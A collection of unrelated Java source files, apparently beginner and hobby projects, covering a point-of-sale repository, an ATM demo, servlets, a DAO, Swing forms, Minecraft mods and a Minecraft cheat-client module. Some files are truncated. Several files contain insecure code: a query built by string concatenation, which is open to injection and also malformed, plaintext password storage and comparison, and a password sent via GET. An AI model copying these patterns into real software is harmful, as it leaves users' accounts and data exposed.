    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\n */\npackage com.mycompany.app.pdv.repositories;\n\nimport com.mycompany.app.pdv.entities.Produto;\nimport java.util.List;\nimport javax.persistence.EntityManager;\n\n/**\n *\n * @author gabri\n */\npublic class ProdutoRepository {\n    private EntityManager entityManager;\n\n    public ProdutoRepository(EntityManager entityManager) {\n        this.entityManager = entityManager;\n    }\n\n    public Produto findById(Integer id) {\n        return entityManager.find(Produto.class, id);\n    }\n\n\n    public List<Produto> findAll() {\n        return entityManager.createQuery(\"SELECT P FROM Produto P\",\n               Produto.class).getResultList();               \n    }\n    \n    public List<Produto> findByDesc(String descricao){\n        return entityManager.createQuery(\"SELECT P FROM Produto P WHERE P.DS_PRODUTO LIKE UPPER(%\"+descricao.toUpperCase()+\"%)\",\n               Produto.class).getResultList();      \n    }\n}\n",
    "import java.util.Scanner;\r\n\r\nclass BankAccount {\r\n    private double balance;\r\n\r\n    public BankAccount(double initialBalance) {\r\n        this.balance = initialBalance;\r\n    }\r\n\r\n    public double getBalance() {\r\n        return balance;\r\n    }\r\n\r\n    public void deposit(double amount) {\r\n        if (amount > 0) {\r\n            balance += amount;\r\n            System.out.println(\"Deposit of $\" + amount + \" successful. Current balance: $\" + balance);\r\n        } else {\r\n            System.out.println(\"Invalid deposit amount.\");\r\n        }\r\n    }\r\n\r\n    public void withdraw(double amount) {\r\n        if (amount > 0 && amount <= balance) {\r\n            balance -= amount;\r\n            System.out.println(\"Withdrawal of $\" + amount + \" successful. Current balance: $\" + balance);\r\n        } else {\r\n            System.out.println(\"Invalid withdrawal amount or insufficient balance.\");\r\n        }\r\n    }\r\n}\r\n\r\nclass ATM {\r\n    private BankAccount bankAccount;\r\n\r\n    public ATM(BankAccount bankAccount) {\r\n        this.bankAccount = bankAccount;\r\n    }\r\n\r\n    public void displayMenu() {\r\n        System.out.println(\"ATM Menu:\");\r\n        System.out.println(\"1. Check Balance\");\r\n        System.out.println(\"2. Deposit\");\r\n        System.out.println(\"3. Withdraw\");\r\n        System.out.println(\"4. Exit\");\r\n    }\r\n\r\n    public void performTransaction(int choice, Scanner scanner) {\r\n        switch (choice) {\r\n            case 1:\r\n                System.out.println(\"Current balance: $\" + bankAccount.getBalance());\r\n                break;\r\n            case 2:\r\n                System.out.print(\"Enter deposit amount: $\");\r\n                double depositAmount = scanner.nextDouble();\r\n                bankAccount.deposit(depositAmount);\r\n                break;\r\n            case 3:\r\n                System.out.print(\"Enter withdrawal amount: $\");\r\n                double withdrawalAmount = scanner.nextDouble();\r\n                bankAccount.withdraw(withdrawalAmount);\r\n                break;\r\n            case 4:\r\n                System.out.println(\"Exiting ATM. Thank you!\");\r\n                scanner.close();\r\n                System.exit(0);\r\n            default:\r\n                System.out.println(\"Invalid choice. Please select a valid option.\");\r\n        }\r\n    }\r\n}\r\n\r\npublic class Task_3_ATM_Interface {\r\n    public static void main(String[] args) {\r\n        Scanner scanner = new Scanner(System.in);\r\n\r\n        System.out.print(\"Enter initial account balance: $\");\r\n        double initialBalance = scanner.nextDouble();\r\n        BankAccount bankAccount = new BankAccount(initialBalance);\r\n\r\n        ATM atm = new ATM(bankAccount);\r\n\r\n        while (true) {\r\n            atm.displayMenu();\r\n            System.out.print(\"Select an option: \");\r\n            int choice = scanner.nextInt();\r\n\r\n            atm.performTransaction(choice, scanner);\r\n        }\r\n    }\r\n}\r\n",
    "package me.ciruu.abyss.modules.misc;\n\nimport java.util.function.Predicate;\nimport me.ciruu.abyss.Globals;\nimport me.ciruu.abyss.enums.Class11;\nimport me.ciruu.abyss.events.network.EventNetworkPrePacketEvent;\nimport me.ciruu.abyss.modules.Module;\nimport me.ciruu.abyss.settings.Setting;\nimport me.zero.alpine.listener.EventHandler;\nimport me.zero.alpine.listener.Listener;\nimport net.minecraft.network.Packet;\nimport net.minecraft.network.play.client.CPacketPlayer;\nimport net.minecraft.network.play.server.SPacketPlayerPosLook;\n\npublic class NoRotate\nextends Module {\n    public final Setting extrapacket = new Setting(\"ExtraPacket\", \"\", this, false);\n    @EventHandler\n    private Listener Field794 = new Listener<EventNetworkPrePacketEvent>(this::Method1046, 5000, new Predicate[0]);\n\n    public NoRotate() {\n        super(\"NoRotate\", \"Prevents server-side rotations. This may desync you from the server.\", Class11.MISC);\n        this.Method1047(this.extrapacket);\n    }\n\n    private void Method1046(EventNetworkPrePacketEvent eventNetworkPrePacketEvent) {\n        if (Globals.mc.world == null || Globals.mc.player == null) {\n            return;\n        }\n        if (eventNetworkPrePacketEvent.Method49() instanceof SPacketPlayerPosLook) {\n            SPacketPlayerPosLook sPacketPlayerPosLook = (SPacketPlayerPosLook)eventNetworkPrePacketEvent.Method49();\n            if (((Boolean)this.extrapacket.getValue()).booleanValue()) {\n                Globals.mc.player.connection.sendPacket((Packet)new CPacketPlayer.PositionRotation(sPacketPlayerPosLook.x, sPacketPlayerPosLook.y, sPacketPlayerPosLook.z, sPacketPlayerPosLook.yaw, sPacketPlayerPosLook.pitch, Globals.mc.player.onGround));\n            }\n            sPacketPlayerPosLook.pitch = Globals.mc.player.rotationPitch;\n            sPacketPlayerPosLook.yaw = Globals.mc.player.rotationYaw;\n        }\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\n */\npackage principal;\nimport javax.swing.JOptionPane;\nimport model.Relogio;\n/**\n *\n * @author emely\n */\npublic class Principal {\n    public static void main(String[] args){\n          String entrada = JOptionPane.showInputDialog(\"Digite HH:MM:SS\");\n          String partes []= entrada.split(\":\");\n          \n          int hora =Integer.parseInt(partes[0]) ;\n          int minuto =Integer.parseInt(partes[1]) ;\n          int segundo =Integer.parseInt(partes[2]) ;\n          \n          Relogio relogio = new Relogio(hora, minuto, segundo);\n          \n         \n           int tempoEmSegundos = relogio.hourToSecound();\n          JOptionPane.showMessageDialog(null, \"Tempo em segundos: \"+tempoEmSegundos);\n          \n          relogio.incrementSecound();\n          JOptionPane.showMessageDialog(null, \"Tempo ap\u00f3s adicionar 1 segundo: \"+relogio.ToString());\n          \n          relogio.incrementMinuto();\n          JOptionPane.showMessageDialog(null, \"Tempo ap\u00f3s adicionar 1 minuto: \"+relogio.ToString());\n          \n          relogio.incrementHour();\n          JOptionPane.showMessageDialog(null, \"Tempo ap\u00f3s adicionar 1 hora: \"+relogio.ToString());\n          \n          relogio.decrementSecound();\n          JOptionPane.showMessageDialog(null, \"Tempo ap\u00f3s tirar 1 segundo: \"+relogio.ToString());\n          \n          relogio.decrementMinuto();\n          JOptionPane.showMessageDialog(null, \"Tempo ap\u00f3s tirar 1 minuto: \"+relogio.ToString());\n          \n          relogio.decrementHour();\n          JOptionPane.showMessageDialog(null, \"Tempo ap\u00f3s tirar 1 hora: \"+relogio.ToString());\n          \n      }\n}\n",
    "package controller;\r\n\r\nimport java.io.IOException;\r\nimport java.sql.SQLException;\r\n\r\nimport javax.servlet.ServletException;\r\nimport javax.servlet.annotation.WebServlet;\r\nimport javax.servlet.http.HttpServlet;\r\nimport javax.servlet.http.HttpServletRequest;\r\nimport javax.servlet.http.HttpServletResponse;\r\nimport javax.servlet.http.HttpSession;\r\n\r\nimport dao.Dao;\r\nimport dto.User;\r\n@WebServlet(\"/userlogin\")\r\npublic class Login extends HttpServlet{\r\n\t@Override\r\n\tprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\r\n\t\tString email = req.getParameter(\"email\");\r\n\t\tString password = req.getParameter(\"password\");\r\n\t\t\r\n\t\tDao dao = new Dao();\r\n\t\t\r\n\t\ttry{\r\n\t\t\tUser u = dao.findByEmail(email);\r\n\t\t\r\n\t\tif(u!=null) \r\n\t\t{\r\n\t\t\t//verify the password\r\n\t\t\tif(u.getUserpassword().equals(password)) {\r\n\t\t\t\t//login success\r\n\t\t\t\t//create session\r\n\t\t\t\treq.getSession().setAttribute(\"user\", u);\r\n\t\t\t\treq.getRequestDispatcher(\"home.jsp\").include(req, resp);\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\t//password wrong\r\n\t\t\t\treq.setAttribute(\"message\", \"password wrong\");\r\n\t\t\t\treq.getRequestDispatcher(\"login.jsp\").include(req, resp);\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}\r\n\t\telse {\r\n\t\t\t//email is wrong\r\n\t\t\treq.setAttribute(\"message\", \"wrong email\");\r\n\t\t\treq.getRequestDispatcher(\"login.jsp\").include(req, resp);\r\n\t\t}\r\n\t}\r\n\t\tcatch(ClassNotFoundException e){\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\tcatch(SQLException e){\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t}\r\n}\r\n",
    "package org.dev.createpyro.registry;\n\nimport net.minecraft.world.level.block.Block;\nimport net.minecraft.world.level.block.state.BlockBehaviour;\nimport net.minecraft.world.level.material.PushReaction;\nimport net.minecraftforge.eventbus.api.IEventBus;\nimport net.minecraftforge.registries.DeferredRegister;\nimport net.minecraftforge.registries.ForgeRegistries;\nimport net.minecraftforge.registries.RegistryObject;\nimport org.dev.createpyro.Pyro;\nimport org.dev.createpyro.block.GunPowderWireBlock;\n\nimport java.util.function.Supplier;\n\npublic class PyroBlocks {\n    public static final DeferredRegister<Block> BLOCKS =\n            DeferredRegister.create(ForgeRegistries.BLOCKS, Pyro.ID);\n\n    public static final RegistryObject<Block> GUN_POWDER_WIRE = registerBlock(\"gun_powder_wire\",\n            () -> new GunPowderWireBlock(BlockBehaviour.Properties.of()\n                    .noCollission()\n                    .instabreak()\n                    .pushReaction(PushReaction.DESTROY)\n            ));\n\n    private static <T extends Block> RegistryObject<T> registerBlock(String name, Supplier<T> block){\n        RegistryObject<T> toReturn = BLOCKS.register(name, block);\n        return toReturn;\n    }\n\n    public static void register(IEventBus eventBus){\n        BLOCKS.register(eventBus);\n    }\n    public static void init() {\n    }\n}\n",
    "import java.util.Arrays;\r\n\r\npublic class shadowing { // showdoing is the practice of using two variables with the same name within the the scope that overlapse\r\n   /*  static int x = 90;// this is shadowed at line 6 because lower level is overriding the upper level\r\n     // cannot use object dependent things with object independent things\r\n    public static void main(String[] args)throws Exception{\r\n          System.out.println(x);  // accessing the object independent thing\r\n          int x = 40;\r\n          System.out.println(x); // scope will begin when value is initialized   //accessing the local variable\r\n          fun();\r\n    }\r\n    static void fun(){\r\n        System.out.println(x);   // trying to access the object independent\r\n    } */\r\n\r\n\r\n    //              VARIABLE LENGTH ARGUMENTS (  VAR ARGS)\r\n    /*public static void main(String[] args) {\r\n        fun(34,43,67,3423,87,54,765,3645,776,3,6,86,865,34,23,00);\r\n        fun(); //empty array\r\n    }\r\n\r\n    static void fun(int ...v){\r\n        System.out.println(Arrays.toString(v));\r\n    }*/\r\n    \r\n    public static void main(String[] args)\r\n    {\r\n         multiple(2 , 3, \"ds\" , \"Shiphali\");\r\n    }\r\n    static void multiple(int a , int b, String ...v){\r\n        System.out.println(a);\r\n        System.out.println(b);\r\n        System.out.println(Arrays.toString(v));\r\n    }\r\n}\r\n",
    "package io.github.crative.extended_armor.items;\n\nimport io.github.crative.extended_armor.ExtendedArmor;\nimport io.github.crative.extended_armor.items.armor_materials.ExtendedArmorMaterials;\nimport io.github.crative.extended_armor.items.custom.ExtendedArmorItem;\nimport net.minecraft.item.ArmorItem;\nimport net.minecraft.item.Item;\nimport net.minecraft.registry.Registries;\nimport net.minecraft.registry.Registry;\nimport net.minecraft.util.Identifier;\nimport org.quiltmc.qsl.item.setting.api.QuiltItemSettings;\n\npublic class ExtendedArmorItems {\n\t//* Ingots\n\tpublic static final Item OBSIDIAN_INGOT = registerItem(\"obsidian_ingot\",\n\t\tnew Item(new QuiltItemSettings()));\n\tpublic static final Item STEALTH_WRAPPINGS = registerItem(\"stealth_wrappings\",\n\t\tnew Item(new QuiltItemSettings()));\n\n\t//* Copper Armor\n\tpublic static final ArmorItem COPPER_HELMET = registerArmorItem(\"copper_helmet\",\n\t\tnew ExtendedArmorItem(ExtendedArmorMaterials.COPPER, ArmorItem.ArmorSlot.HELMET, new QuiltItemSettings()));\n\tpublic static final ArmorItem COPPER_CHESTPLATE = registerArmorItem(\"copper_chestplate\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.COPPER, ArmorItem.ArmorSlot.CHESTPLATE, new QuiltItemSettings()));\n\tpublic static final ArmorItem COPPER_LEGGINGS = registerArmorItem(\"copper_leggings\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.COPPER, ArmorItem.ArmorSlot.LEGGINGS, new QuiltItemSettings()));\n\tpublic static final ArmorItem COPPER_BOOTS = registerArmorItem(\"copper_boots\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.COPPER, ArmorItem.ArmorSlot.BOOTS, new QuiltItemSettings()));\n\n\t//* Stealth Armor\n\tpublic static final ArmorItem STEALTH_HELMET = registerArmorItem(\"stealth_helmet\",\n\t\tnew ExtendedArmorItem(ExtendedArmorMaterials.STEALTH, ArmorItem.ArmorSlot.HELMET, new QuiltItemSettings()));\n\tpublic static final ArmorItem STEALTH_CHESTPLATE = registerArmorItem(\"stealth_chestplate\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.STEALTH, ArmorItem.ArmorSlot.CHESTPLATE, new QuiltItemSettings()));\n\tpublic static final ArmorItem STEALTH_LEGGINGS = registerArmorItem(\"stealth_leggings\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.STEALTH, ArmorItem.ArmorSlot.LEGGINGS, new QuiltItemSettings()));\n\tpublic static final ArmorItem STEALTH_BOOTS = registerArmorItem(\"stealth_boots\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.STEALTH, ArmorItem.ArmorSlot.BOOTS, new QuiltItemSettings()));\n\n\t//* Obsidian Armor\n\tpublic static final ArmorItem OBSIDIAN_HELMET = registerArmorItem(\"obsidian_helmet\",\n\t\tnew ExtendedArmorItem(ExtendedArmorMaterials.OBSIDIAN, ArmorItem.ArmorSlot.HELMET, new QuiltItemSettings()));\n\tpublic static final ArmorItem OBSIDIAN_CHESTPLATE = registerArmorItem(\"obsidian_chestplate\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.OBSIDIAN, ArmorItem.ArmorSlot.CHESTPLATE, new QuiltItemSettings()));\n\tpublic static final ArmorItem OBSIDIAN_LEGGINGS = registerArmorItem(\"obsidian_leggings\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.OBSIDIAN, ArmorItem.ArmorSlot.LEGGINGS, new QuiltItemSettings()));\n\tpublic static final ArmorItem OBSIDIAN_BOOTS = registerArmorItem(\"obsidian_boots\",\n\t\tnew ArmorItem(ExtendedArmorMaterials.OBSIDIAN, ArmorItem.ArmorSlot.BOOTS, new QuiltItemSettings()));\n\n\n\t//* Registry\n\tprivate static Item registerItem(String name, Item item){\n\t\treturn Registry.register(Registries.ITEM, new Identifier(ExtendedArmor.MOD_ID, name), item);\n\t}\n\tprivate static ArmorItem registerArmorItem(String name, ArmorItem armorItem){\n\t\treturn Registry.register(Registries.ITEM, new Identifier(ExtendedArmor.MOD_ID, name), armorItem);\n\t}\n\n\tpublic static void registerModItems(){\n\t\tExtendedArmor.LOGGER.info(\"Registering mod items for \" + ExtendedArmor.MOD_ID);\n\t}\n}\n",
    "package binarySearchTree;\n\npublic class BinaryTreeNodeFindingANode {\n    int data;\n    BinaryTreeNodeFindingANode leftNode;\n    BinaryTreeNodeFindingANode rightNode;\n\n    public BinaryTreeNodeFindingANode(int data) {\n        this.data = data;\n    }\n}\n\nclass BinaryTree1 {\n    BinaryTreeNodeFindingANode rootNode;\n\n    public void insertNode(int data) {\n        BinaryTreeNodeFindingANode node = new BinaryTreeNodeFindingANode(data);\n        if (rootNode == null) {\n            rootNode = node;\n        } else {\n            BinaryTreeNodeFindingANode currentNode = rootNode;\n            BinaryTreeNodeFindingANode parentNode;\n            while (true) {\n                parentNode = currentNode;\n                if (data < currentNode.data) {\n                    currentNode = currentNode.leftNode;\n                    if (currentNode == null) {\n                        parentNode.leftNode = node;\n                        return;\n                    }\n                } else {\n                    currentNode = currentNode.rightNode;\n                    if (currentNode == null) {\n                        parentNode.rightNode = node;\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    public BinaryTreeNodeFindingANode find(int key) {\n        BinaryTreeNodeFindingANode currentNode = rootNode;\n        while (currentNode.data != key) {\n            if (key < currentNode.data) currentNode = currentNode.leftNode;\n            else currentNode = currentNode.rightNode;\n            if (currentNode == null) return null;\n        }\n        return currentNode;\n    }\n}\n\n\nclass Main1 {\n    public static void main(String[] args) {\n        BinaryTree1 binaryTree1 = new BinaryTree1();\n        binaryTree1.insertNode(53);\n        BinaryTreeNodeFindingANode thirty = new BinaryTreeNodeFindingANode(30);\n        BinaryTreeNodeFindingANode seventyTwo = new BinaryTreeNodeFindingANode(72);\n        BinaryTreeNodeFindingANode fourteen = new BinaryTreeNodeFindingANode(14);\n        BinaryTreeNodeFindingANode thirtyNine = new BinaryTreeNodeFindingANode(39);\n        BinaryTreeNodeFindingANode sixtyOne = new BinaryTreeNodeFindingANode(61);\n        BinaryTreeNodeFindingANode eightyFour = new BinaryTreeNodeFindingANode(84);\n        BinaryTreeNodeFindingANode seventyNine = new BinaryTreeNodeFindingANode(79);\n        BinaryTreeNodeFindingANode nine = new BinaryTreeNodeFindingANode(9);\n        BinaryTreeNodeFindingANode TwentyThree = new BinaryTreeNodeFindingANode(23);\n        BinaryTreeNodeFindingANode thirtyFour = new BinaryTreeNodeFindingANode(34);\n        BinaryTreeNodeFindingANode fourtySeven = new BinaryTreeNodeFindingANode(47);\n        binaryTree1.rootNode = new BinaryTreeNodeFindingANode(53); // Initialize rootNode\n        binaryTree1.rootNode.leftNode = thirty; // Initialize leftNode of rootNode\n        binaryTree1.rootNode.rightNode = seventyTwo; // Initialize rightNode of rootNode\n        thirty.leftNode = fourteen;\n        thirty.rightNode = thirtyNine;\n        seventyTwo.leftNode = sixtyOne;\n        seventyTwo.rightNode = eightyFour;\n        fourteen.leftNode = nine;\n        fourteen.rightNode = TwentyThree;\n        thirtyNine.leftNode = thirtyFour;\n        thirtyNine.rightNode = fourtySeven;\n        eightyFour.leftNode = seventyNine;\n        BinaryTreeNodeFindingANode findResult = binaryTree1.find(23);\n        if (findResult.data == Integer.MIN_VALUE) {\n            System.out.println(\"Node with key not found.\");\n        } else {\n            System.out.println(\"Node found with key: \" + findResult.data);\n        }\n    }\n}\n",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage dao;\r\n\r\nimport java.sql.Connection;\r\nimport java.sql.PreparedStatement;\r\nimport java.sql.ResultSet;\r\nimport java.util.ArrayList;\r\n\r\nimport database.JDBCUtil;\r\nimport model.Account;\r\n\r\npublic class AccountDAO implements DAOInterface<Account> {\r\n    public static AccountDAO getInstance() {\r\n        return new AccountDAO();\r\n    }\r\n\r\n    @Override\r\n    public int insert(Account t) {\r\n        int ketQua = 0;\r\n        try {\r\n            Connection con = JDBCUtil.getConnection();\r\n            String sql = \"INSERT INTO Account (fullName, userName, password, role, status, email) \"\r\n                    + \"VALUES (?,?,?,?,?,?)\";\r\n            PreparedStatement pst = con.prepareStatement(sql);\r\n            pst.setString(1, t.getFullName());\r\n            pst.setString(2, t.getUser());\r\n            pst.setString(3, t.getPassword());\r\n            pst.setString(4, t.getRole());\r\n            pst.setInt(5, t.getStatus());\r\n            pst.setString(6, t.getEmail());\r\n            \r\n            ketQua = pst.executeUpdate();\r\n            JDBCUtil.closeConnection(con);\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        return ketQua;\r\n    }\r\n\r\n    @Override\r\n    public int update(Account t) {\r\n        int ketQua = 0;\r\n        try {\r\n            Connection con = JDBCUtil.getConnection();\r\n            String sql = \"UPDATE Account SET fullName=?, password=?, role=?, status=?, email=? \"\r\n                    + \"WHERE userName=?\";\r\n            PreparedStatement pst = con.prepareStatement(sql);\r\n            pst.setString(1, t.getFullName());\r\n            pst.setString(2, t.getPassword());\r\n            pst.setString(3, t.getRole());\r\n            pst.setInt(4, t.getStatus());\r\n            pst.setString(6, t.getUser());\r\n            pst.setString(5, t.getEmail());\r\n\r\n            ketQua = pst.executeUpdate();\r\n            JDBCUtil.closeConnection(con);\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        return ketQua;\r\n    }\r\n\r\n    @Override\r\n    public int delete(Account t) {\r\n        int ketQua = 0;\r\n        try {\r\n            Connection con = JDBCUtil.getConnection();\r\n            String sql = \"DELETE FROM Account WHERE userName=?\";\r\n            PreparedStatement pst = con.prepareStatement(sql);\r\n            pst.setString(1, t.getUser());\r\n            ketQua = pst.executeUpdate();\r\n            JDBCUtil.closeConnection(con);\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        return ketQua;\r\n    }\r\n\r\n    @Override\r\n    public ArrayList<Account> selectAll() {\r\n        ArrayList<Account> ketQua = new ArrayList<Account>();\r\n        try {\r\n            Connection con = JDBCUtil.getConnection();\r\n            String sql = \"SELECT * FROM Account\";\r\n            PreparedStatement pst = con.prepareStatement(sql);\r\n            ResultSet rs = pst.executeQuery();\r\n            while (rs.next()) {\r\n                String fullName = rs.getString(\"fullName\");\r\n                String userName = rs.getString(\"userName\");\r\n                String password = rs.getString(\"password\");\r\n                String role = rs.getString(\"role\");\r\n                int status = rs.getInt(\"status\");\r\n                String email = rs.getString(\"email\");\r\n\r\n                Account acc = new Account(fullName, userName, password, role, status, email);\r\n                ketQua.add(acc);\r\n            }\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        return ketQua;\r\n    }\r\n\r\n    @Override\r\n    public Account selectById(String t) {\r\n        Account acc = null;\r\n        try {\r\n            Connection con = JDBCUtil.getConnection();\r\n            String sql = \"SELECT * FROM Account WHERE userName=?\";\r\n            PreparedStatement pst = con.prepareStatement(sql);\r\n            pst.setString(1, t);\r\n            ResultSet rs = pst.executeQuery();\r\n            while (rs.next()) {\r\n                String fullName = rs.getString(\"fullName\");\r\n                String userName = rs.getString(\"userName\");\r\n                String password = rs.getString(\"password\");\r\n                String role = rs.getString(\"role\");\r\n                int status = rs.getInt(\"status\");\r\n                String email = rs.getString(\"email\");\r\n                acc = new Account(fullName, userName, password, role, status, email);\r\n            }\r\n            JDBCUtil.closeConnection(con);\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        return acc;\r\n    }\r\n\r\n    public int updatePassword(String email, String password) {\r\n        int ketQua = 0;\r\n        try {\r\n            Connection con = JDBCUtil.getConnection();\r\n            String sql = \"UPDATE Account SET password=? WHERE email=?\";\r\n            PreparedStatement pst = con.prepar",
    "\npackage AA_RUN_THESE_ONLY;\n\nimport ADMIN_DRIVER.DRIVERJSON;\nimport ADMIN_DRIVER.DRIVER_MENU;\nimport com.formdev.flatlaf.FlatLightLaf;\nimport java.awt.Color;\nimport java.awt.Font;\nimport java.awt.Toolkit;\nimport java.awt.event.WindowEvent;\nimport java.io.IOException;\nimport javax.swing.JLabel;\nimport javax.swing.JOptionPane;\nimport javax.swing.UIManager;\nimport javax.swing.UnsupportedLookAndFeelException;\nimport org.json.simple.JSONArray;\nimport org.json.simple.JSONObject;\nimport org.json.simple.parser.JSONParser;\nimport org.json.simple.parser.ParseException;\n\npublic class DRIVER_LOGIN extends javax.swing.JFrame {\n    \n    static JSONObject folder;\n    static JSONArray list;\n    static JSONObject info;\n    static JSONParser jsonParser;\n    static {\n        jsonParser = new JSONParser();\n        folder = new JSONObject();\n        list = new JSONArray();\n        info = new JSONObject(); \n    }\n    \n        static String user;\n        \n        public DRIVER_LOGIN() {\n        initComponents();\n    }\n        \n        private void errortext(JLabel lbl){\n        lbl.setText(lbl.getText()+\"*\");\n        lbl.setForeground(Color.RED);\n        lbl.setFont(new Font(lbl.getFont().getName(), Font.BOLD, 12));\n    }\n        \n        private void resettext(JLabel lbl){\n        lbl.setText(lbl.getText());\n        lbl.setForeground(Color.BLACK);\n        lbl.setFont(new Font(lbl.getFont().getName(), Font.PLAIN, 12));\n    }\n        \n        public void close(){\n        WindowEvent closeWindow = new WindowEvent(this, WindowEvent.WINDOW_CLOSING);\n        Toolkit.getDefaultToolkit().getSystemEventQueue().postEvent(closeWindow);\n    }\n        \n        public static String DriverID(){\n        return user;\n    }\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        txtID = new javax.swing.JTextField();\n        lblUSERNAME = new javax.swing.JLabel();\n        lblPASSWORD = new javax.swing.JLabel();\n        txtPASS = new javax.swing.JPasswordField();\n        btnTIMEIN = new javax.swing.JButton();\n        jLabel4 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);\n\n        jPanel1.setBackground(new java.awt.Color(255, 255, 255));\n\n        jLabel1.setFont(new java.awt.Font(\"Montserrat Black\", 0, 24)); // NOI18N\n        jLabel1.setText(\"DRIVER ADMIN LOGIN\");\n\n        txtID.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                txtIDActionPerformed(evt);\n            }\n        });\n\n        lblUSERNAME.setFont(new java.awt.Font(\"Segoe UI\", 0, 14)); // NOI18N\n        lblUSERNAME.setText(\"ID\");\n\n        lblPASSWORD.setFont(new java.awt.Font(\"Segoe UI\", 0, 14)); // NOI18N\n        lblPASSWORD.setText(\"PASSCODE\");\n\n        btnTIMEIN.setText(\"TIME IN\");\n        btnTIMEIN.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btnTIMEINActionPerformed(evt);\n            }\n        });\n\n        jLabel4.setIcon(new javax.swing.ImageIcon(getClass().getResource(\"/IMAGES/yumqueuetext_.png\"))); // NOI18N\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(jPanel1Layout.createSequentialGroup()\n                        .addGap(30, 30, 30)\n                        .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                            .addComponent(lblUSERNAME)\n                            .addComponent(lblPASSWORD))\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                        .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                            .addComponent(btnTIMEIN, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                            .addComponent(txtID)\n                            .addComponent(txtPASS, javax.swing.GroupLayout.PREFERRED_SIZE, 282, javax.swing.GroupLayout.PREFERRED_SIZE)))\n                    .addGroup(jPanel1Layout.createSequentialGroup()\n                        .addGap(39, 39, 39)\n                        .addComponent(jLabel4)))\n                .addContainerGap(javax.",
    "package com;\r\n\r\nimport java.io.IOException;\r\nimport java.io.PrintWriter;\r\nimport java.text.NumberFormat.Style;\r\n\r\nimport javax.servlet.RequestDispatcher;\r\nimport javax.servlet.ServletException;\r\nimport javax.servlet.annotation.WebServlet;\r\nimport javax.servlet.http.HttpServlet;\r\nimport javax.servlet.http.HttpServletRequest;\r\nimport javax.servlet.http.HttpServletResponse;\r\n\r\nimport dbs.DBService;\r\nimport dto.Admin;\r\n\r\n\r\n@WebServlet(\"/SignupServlet\")\r\npublic class SignupServlet extends HttpServlet \r\n{\r\n\t\r\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\t\r\n\t\tPrintWriter out = response.getWriter();\r\n\t\tAdmin a = new Admin();\r\n\t\ta.setEmail(request.getParameter(\"email\"));\r\n\t\ta.setPassword(request.getParameter(\"password\"));\r\n\t\tDBService db = new DBService();\r\n\t\tString target=\"\";\r\n\t\tint x =db.signup(a);\r\n\t\tif(x>0)\r\n\t\t{\r\n\t\t\r\n\t\t\trequest.setAttribute(\"sms\", \"<h4>Signup successfully</h4>\");\r\n\r\n\t\t\ttarget=\"signup.jsp\";\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\trequest.setAttribute(\"sms\",\"<h4>Invalid Email/Password</h4>\");\r\n\t\t\t\r\n\t\t\ttarget=\"signup.jsp\";\r\n\t\t}\r\n\t\tRequestDispatcher rd = getServletContext().getRequestDispatcher(\"/\"+target);\r\n\t\trd.forward(request, response);\r\n\t}\r\n\r\n}\r\n",
